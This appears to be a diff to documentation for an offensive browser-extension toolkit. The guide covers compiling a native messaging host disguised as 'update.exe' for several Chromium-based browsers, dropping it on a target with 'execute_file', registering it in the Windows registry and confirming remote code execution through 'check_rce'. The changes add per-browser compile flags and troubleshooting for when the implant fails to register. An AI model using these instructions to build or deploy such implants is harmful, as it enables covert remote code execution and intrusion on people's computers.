@@ -8,14 +8,26 @@ Compile it once locally, host the binary, then drop it with `execute_file`.
 ## 1. Compile (Windows host)
 
 ```bash
-# Edge target
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBROWSER=edge \
-  -o update.exe native-host.c
+# Edge (default — no flag)
+x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -o update.exe native-host.c
 
-# Chrome target
-x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBROWSER=chrome \
-  -o update.exe native-host.c
+# Chrome
+x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DCHROME -o update.exe native-host.c
+
+# Vivaldi
+x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DVIVALDI -o update.exe native-host.c
+
+# Brave
+x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBRAVE -o update.exe native-host.c
+
+# Chromium
+x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DCHROMIUM -o update.exe native-host.c
 ```
+
+> ⚠️ Do **not** use `-DBROWSER=edge` / `-DBROWSER=chrome` / `-DBROWSER=vivaldi`.
+> That defines a string macro the source never tests — it silently compiles an
+> **Edge** host regardless of the value, so `check_rce` reports
+> `Specified native messaging host not found` on every other browser.
 
 Result: a ~46 KB standalone `update.exe`, no dependencies. Install MinGW with
 `sudo dnf install mingw64-gcc` (Fedora) or `sudo apt install gcc-mingw-w64-x86-64`
@@ -52,4 +64,7 @@ with a 60 s timeout. Message size is capped at 1 MB (Chrome's limit).
   `allowed_origins` matches the real agent ID — Chrome rejects wildcards.
 - `allowed_origins` uses `chrome-extension://<32-char-id>/`.
 - If `check_rce` reports `rce_active: false`, the host is not installed or the
-  browser has not been restarted since installation.
+  browser has not been restarted since installation. The most common cause is
+  compiling with the wrong (or no) browser flag: the host then registers under a
+  different browser's `HKCU\Software\...\NativeMessagingHosts` key, and the
+  target browser reports `Specified native messaging host not found`.
